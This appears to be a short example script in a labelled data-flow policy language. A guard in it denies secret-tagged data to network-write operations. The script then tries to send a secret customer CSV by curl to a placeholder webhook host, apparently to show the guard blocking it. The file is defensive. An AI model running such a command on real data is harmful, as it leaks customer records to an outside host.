var secret @customerList = <internal/customers.csv>

guard @noSecretExfil before op:exe = when [
  @input.any.mx.labels.includes("secret") && @mx.op.labels.includes("net:w") => deny "Secret data cannot flow to network operations"
  * => allow
]

exe net:w @postToWebhook(data) = run cmd { curl -d "@data" https://hooks.example.com/ingest }

show @postToWebhook(@customerList)